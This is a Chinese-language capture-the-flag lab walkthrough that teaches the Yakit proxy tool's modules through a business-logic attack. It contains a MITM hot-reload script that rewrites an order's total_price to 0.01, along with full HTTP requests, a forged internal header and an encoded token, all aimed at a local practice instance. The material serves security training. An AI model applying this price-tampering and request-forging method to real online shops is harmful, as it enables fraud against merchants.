---
title: 业务链攻击：1 分钱买下商城商品
difficulty: practitioner
---

# 业务链攻击：1 分钱买下商城商品

## 原理背景

真实渗透不是"单点漏洞一把梭"，而是**把工具串成流水线**：代理看清业务 → 脚本自动改包 → 手搓完成最后一击 → 编码穿过校验边界。价格篡改是这套流水线最经典的舞台——服务端**信任了客户端提交的金额**，攻击者只要在下单请求到达服务端之前改掉 `total_price`，就能用任意价格买走商品。

本题要用 899 元商品的 **1 分钱** 完成下单，并读出本实例 flag。靶机会在网关层观察整条业务链：**MITM 观察、热加载改价、Fuzzer 标记头重放、Codec 编码链**四个信号全部命中，`/flag` 才解锁。四步可按任意顺序完成，但缺一步都不行。

## Yakit 四模块怎么用

**① MITM 代理观察**：系统（或浏览器插件）代理指向 Yakit MITM 监听地址，装一次证书（MITM 页有引导）。浏览器里的每一次登录、下单都会出现在 MITM 历史里——**先让真实业务流量跑起来，你在旁边看**，这是所有测试的标准开局。

**② 热加载自动改包**：MITM 页进入「热加载」/插件面板，新建 Yak 脚本。对劫持到的请求做改写（本例：命中订单提交接口就把金额换成 0.01），保存即生效——**不用断开代理、不用重启**，下一个经过的请求就带着你的改写逻辑。一段可以直接抄的脚本骨架：

```javascript
// MITM 热加载脚本：把商城订单的价格改写为 0.01
if (isTLS && fisHost("你的实例地址")) {
    if (fisPost() && fisContains(url, `/mall/order/submit`)) {
        body = replace(body, `"total_price":"199.00"`, `"total_price":"0.01"`)
    }
}
```

写脚本前先用 MITM 历史抓一次真实下单，看清 body 的确切格式（金额字段叫什么、长什么样），再对照着写替换规则——**观察在先，改写在后**。

**③ Web Fuzzer 手搓重放**：右键 MITM 历史里的订单请求「发送到 Web Fuzzer」，在请求头区手工新增一行 `X-Mall-Internal: yakit-order`（订单系统只认内部通道，浏览器表单发不出这种自定义头），发送。整条请求（方法、路径、头、体）都在你手里——这正是 Fuzzer 与浏览器的本质差别。

**④ Codec 编码链**：订单系统还有一道内部校验：口令 `codec~proof` 要先 base64 编码、**再** URL 编码，作为 `token` 参数请求校验端点。base64 结果 `Y29kZWN+cHJvb2Y=` 里的 `+` 在 URL 查询参数中会被解析成**空格**、`=` 是键值分隔符——不做 URL 编码，口令在半路就被改写，端点只会 400。**编码链的每一环都不能错**。

## 开始实战

点击 **前往配套题目练习**，启动环境后按链路走：挂代理用 `user1` / `password123` 登录商城并尝试下单（观察）；写热加载脚本改价（tamper）；Fuzzer 重放下单并加 `X-Mall-Internal: yakit-order` 头（replay）；最后用 Codec 把口令 `codec~proof` 经 base64 → URL 编码送到校验端点 `GET /academy/codec/verify?token=...`（codec）。四步信号齐备后 `GET /flag` 读出本实例真 flag 并提交。

<details>
<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>

以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。

**第 1 步：启动实验环境**

题目详情页点「启动实验环境」，等状态 running，复制访问地址。

**第 2 步：MITM 观察——商城登录 + 一次原价下单**

不用浏览器的话，直接在 Web Fuzzer 发（与走代理是同一条链，网关都能观察到）：

```http
POST /mall/user/login HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: application/json

{"username": "user1", "password": "password123"}
```

响应 `{"success":true,"message":"Login successful"}`，并下发 `Set-Cookie: sessionID=...`——记下这个会话。再带会话下一次原价单（看清订单 body 的格式，热加载脚本要照着写）：

```http
POST /mall/order/submit HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: application/json
Cookie: sessionID=<刚拿到的值>

{"product_id": 70, "quantity": 1, "total_price": "199.00"}
```

响应「订单提交成功」——**注意：这是观察步骤，网关只认改价后的订单，原价单不算**。

**第 3 步：热加载——MITM 里挂改价脚本**

把上一步的订单请求右键「发送到 Web Fuzzer」，把 `total_price` 改成 `0.01` 发送（这就是价格篡改；走 MITM 热加载脚本自动改是完全等价的做法，脚本骨架见上文，替换规则写 `"total_price":"199.00"` → `"total_price":"0.01"`，热加载面板保存即生效）：

```http
POST /mall/order/submit HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: application/json
Cookie: sessionID=<会话值>

{"product_id": 70, "quantity": 1, "total_price": "0.01"}
```

响应同样是「订单提交成功」——1 分钱订单已被服务端接受，价格篡改成立。

**第 4 步：Fuzzer 重放——加上内部通道标记头**

在 Fuzzer 里给改价后的订单请求再加一行自定义头（浏览器表单发不出的请求形态）：

```http
POST /mall/order/submit HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: application/json
Cookie: sessionID=<会话值>
X-Mall-Internal: yakit-order

{"product_id": 70, "quantity": 1, "total_price": "0.01"}
```

**第 5 步：Codec 编码链——通过内部校验端点**

打开工具集里的 **Codec 编码解码**：

1. 输入口令 `codec~proof`，做 base64 编码，得到 `Y29kZWN+cHJvb2Y=`——注意输出里带着 `+` 和 `=`，这两个字符直接放进 URL 都会出事；
2. 对 base64 结果**再做一次 URL 编码**：`+` 变 `%2B`、`=` 变 `%3D`，得到 `Y29kZWN%2BcHJvb2Y%3D`；
3. 请求校验端点：

```http
GET /academy/codec/verify?token=Y29kZWN%2BcHJvb2Y%3D HTTP/1.1
Host: 127.0.0.1:36870
```

响应 JSON `{"ok":true,...}` 即编码链正确（裸发 base64 会得到 400——对照做一遍加深印象）。

**第 6 步：读取本实例 flag**

四步信号齐备后 `GET /flag` 自动解锁（之前直接访问是 403）：

```http
GET /flag HTTP/1.1
Host: 127.0.0.1:36870
```

响应就是 flag 原文（一行，`flag{lab-...}`）。

**第 7 步：提交答案**

回到题目详情页，在答案框输入刚读到的 flag 原文（`flag{lab-...}` 整串）提交。

</details>

## 延伸：流水线化是效率的分水岭

四步链里热加载是承上启下的枢纽：**观察**（MITM 历史）产出样本，**改写**（热加载脚本）把样本变成攻击载荷，**执行**（Fuzzer/批量重放）拿到结果。 Yakit 里还能把改写脚本、fuzztag 字典、批量重放组合起来，让整条流水线全自动跑——人工只负责判断哪条结果值得深挖。练熟这套组合，你就从"会用工具"进阶到了"指挥工具"。

模块专精专题完。回到攻击面专题，用流水线打法重新审视那些单点漏洞。